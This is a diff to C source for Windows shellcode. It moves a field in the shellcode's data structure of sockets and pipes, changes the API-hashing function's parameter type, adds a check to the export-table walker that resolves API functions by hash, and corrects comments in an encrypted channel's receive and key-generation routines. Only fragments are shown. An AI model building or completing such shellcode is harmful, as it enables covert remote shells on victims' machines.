@@ -108,7 +108,6 @@ typedef struct _spp_tek_t {
 
 // shellcode data structure
 typedef struct _sc_v_tbl_t {
-  spp_blk             blk;
   SOCKET              s;      // socket
   HANDLE              out1;   // CreateNamedPipe
   HANDLE              in0;    // CreatePipe read
@@ -121,6 +120,7 @@ typedef struct _sc_v_tbl_t {
   DWORD               evt_cnt;
   DWORD               secure;
   HCRYPTPROV          hProv;
+  spp_blk             blk;
   spp_tek             tek;
   aes_ctx             ctx;
 } v_tbl;
@@ -276,7 +276,7 @@ void main(void)
   //return 0;
 }
 
-DWORD api_hash(PCHAR str)
+DWORD api_hash(uint8_t str[])
 {
   DWORD h = 0;
   
@@ -331,12 +331,15 @@ LPVOID getapi (DWORD dwHash)
     dir  = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
     rva  = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
     
-    // if no exports, continue
+    // if no export table, continue
     if (rva==0) continue;
     
     exp = (PIMAGE_EXPORT_DIRECTORY) RVA2OFS(ULONG_PTR, base, rva);
-      
     cnt = exp->NumberOfNames;
+    
+    // if no api, continue
+    if (cnt==0) continue;
+    
     adr = RVA2OFS(PDWORD,base, exp->AddressOfFunctions);
     sym = RVA2OFS(PDWORD,base, exp->AddressOfNames);
     ord = RVA2OFS(PWORD, base, exp->AddressOfNameOrdinals);
@@ -739,7 +742,7 @@ int spp_recv (sc_tbl *c)
   
   // 11. if not secure, goto step 14
   if (c->v.secure) {
-    // 12. decrypt the length, verify mac
+    // 12. decrypt the data, verify mac
     len=spp_crypt(c, &c->v.blk.data.b, 
         c->v.blk.len.buflen, SPP_DECRYPT);
     // 13. if decryption error, return ENC error
@@ -763,7 +766,7 @@ int spp_recv (sc_tbl *c)
  * Generate SPP session keys
  *
  ************************************************/
-// generate iv, mac and enc keys
+// generate ctr, mac and enc keys
 void spp_genkeys(sc_tbl *x)
 {
   BYTE     rnd[64];
